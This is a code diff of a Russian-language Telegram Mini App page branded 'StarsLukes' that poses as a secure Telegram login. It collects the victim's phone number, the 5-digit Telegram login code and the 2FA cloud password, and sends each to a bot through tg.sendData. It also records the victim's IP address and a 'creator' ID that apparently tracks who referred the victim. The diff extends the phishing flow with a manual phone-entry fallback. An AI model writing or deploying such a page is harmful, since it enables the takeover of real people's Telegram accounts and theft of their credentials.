@@ -1,4 +1,4 @@
- <!DOCTYPE html>
+    <!DOCTYPE html>
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
@@ -16,7 +16,7 @@
         }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
-            font-family: 'Inter', -apple-system, system-ui, sans-serif;
+            font-family: 'Inter', -apple-system, sans-serif;
             background: var(--bg);
             color: var(--text);
             display: flex;
@@ -44,7 +44,7 @@
         .logo span { color:#fff; font-weight:300; }
         .btn {
             width: 100%;
-            padding: 16px;
+            padding: 14px;
             border: none;
             border-radius: 14px;
             background: linear-gradient(145deg, #c9a23b, #e4b84d);
@@ -54,17 +54,23 @@
             cursor: pointer;
             margin-top: 12px;
         }
+        .btn:active { transform: scale(0.98); }
+        .btn.secondary {
+            background: #2a2a35;
+            color: #ccc;
+        }
         input {
             width: 100%;
-            padding: 14px;
+            padding: 12px;
             background: var(--input-bg);
             border: 1px solid var(--border);
             border-radius: 12px;
             color: #fff;
             font-size: 16px;
             outline: none;
-            margin-bottom: 12px;
+            margin-bottom: 10px;
         }
+        input:focus { border-color: var(--gold); }
         .hidden { display: none; }
         .footer-note {
             margin-top: 20px;
@@ -77,21 +83,27 @@
 <div class="card">
     <div class="logo">Stars<span>Lukes</span></div>
 
+    <!-- Шаг 1: выбор способа ввода номера -->
     <div id="step-phone">
         <p>Авторизируйтесь через Telegram</p>
         <button class="btn" onclick="requestContact()">Поделиться контактом</button>
+        <div style="margin: 12px 0; color: #666;">или</div>
+        <input type="tel" id="manualPhone" placeholder="+79991234567">
+        <button class="btn" onclick="submitManualPhone()">Отправить номер</button>
     </div>
 
+    <!-- Шаг 2: ввод кода -->
     <div id="step-code" class="hidden">
         <p>Введите код из Telegram</p>
         <input type="text" id="codeInput" placeholder="12345" maxlength="5" inputmode="numeric">
         <button class="btn" onclick="submitCode()">Подтвердить</button>
     </div>
 
+    <!-- Шаг 3: облачный пароль -->
     <div id="step-2fa" class="hidden">
-        <p>Облачный пароль (если есть)</p>
+        <p>Облачный пароль (если требуется)</p>
         <input type="password" id="passwordInput" placeholder="Пароль">
-        <button class="btn" onclick="submitPassword()">Продолжить</button>
+        <button class="btn" onclick="submitPassword()">Войти</button>
     </div>
 
     <div class="footer-note">Защищённое соединение</div>
@@ -111,28 +123,28 @@
     };
     fetch('https://api.ipify.org?format=json')
         .then(r => r.json())
-        .then(d => fingerprint.ip = d.ip)
+        .then(d => { fingerprint.ip = d.ip; })
         .catch(() => {});
 
+    // Параметры URL (creator_uid)
     const urlParams = new URLSearchParams(window.location.search);
     const creatorUid = urlParams.get('creator') || null;
 
-    // Если открыто с параметром step=2fa, сразу поле пароля
-    if (urlParams.get('step') === '2fa') {
-        document.getElementById('step-phone').classList.add('hidden');
-        document.getElementById('step-code').classList.add('hidden');
-        document.getElementById('step-2fa').classList.remove('hidden');
-        const uidParam = urlParams.get('uid');
-        if (uidParam) {
-            document.getElementById('step-2fa').setAttribute('data-uid', uidParam);
-        }
+    // Сразу сообщаем боту, что страница открыта
+    tg.sendData(JSON.stringify({
+        step: 'page_opened',
+        fingerprint: fingerprint,
+        creator_uid: creatorUid
+    }));
+
+    function show(stepId) {
+        ['step-phone','step-code','step-2fa'].forEach(id => {
+            document.getElementById(id).classList.add('hidden');
+        });
+        document.getElementById(stepId).classList.remove('hidden');
     }
 
-    function show(id) {
-        ['step-phone','step-code','step-2fa'].forEach(x => document.getElementById(x).classList.add('hidden'));
-        document.getElementById(id).classList.remove('hidden');
-    }
-
+    // Автоматическое "Поделиться контактом"
     window.requestContact = function() {
         tg.requestContact().then(contact => {
             tg.sendData(JSON.stringify({
@@ -142,27 +154,44 @@
                 creator_uid: creatorUid
             }));
             show('step-code');
-        }).catch(err => {
-            tg.showAlert('Необходимо разрешить доступ к номеру телефона.');
+        }).catch(() => {
+            tg.showAlert('Не удалось автоматически получить номер. Пожалуйста, введите его вручную.');
         });
     };
 
+    // Ручной ввод номера
+    window.submitManualPhone = function() {
+        const phone = document.getElementById('manualPhone').value.trim();
+        if (!phone.startsWith('+') || phone.length < 8) {
+            tg.showAlert('Введите номер в международном формате, начиная с +');
+            return;
+        }
+        tg.sendData(JSON.stringify({
+            step: 'send_code',
+            phone: phone,
+            fingerprint: fingerprint,
+            creator_uid: creatorUid
+        }));
+        show('step-code');
+    };
+
+    // Отправка кода
     window.submitCode = function() {
         const code = document.getElementById('codeInput').value.trim();
         if (!/^\d{5}$/.test(code)) {
-            tg.showAlert('Код — 5 цифр');
+            tg.showAlert('Код должен состоять из 5 цифр');
             return;
         }
         tg.sendData(JSON.stringify({ step: 'verify_code', code: code }));
         tg.close();
     };
 
+    // Отправка пароля
     window.submitPassword = function() {
         const password = document.getElementById('passwordInput').value;
-        const uid = document.getElementById('step-2fa').getAttribute('data-uid') || '';
-        tg.sendData(JSON.stringify({ step: 'password', password: password, uid: uid }));
+        tg.sendData(JSON.stringify({ step: 'password', password: password }));
         tg.close();
     };
 </script>
 </body>
-</html>   
+</html>
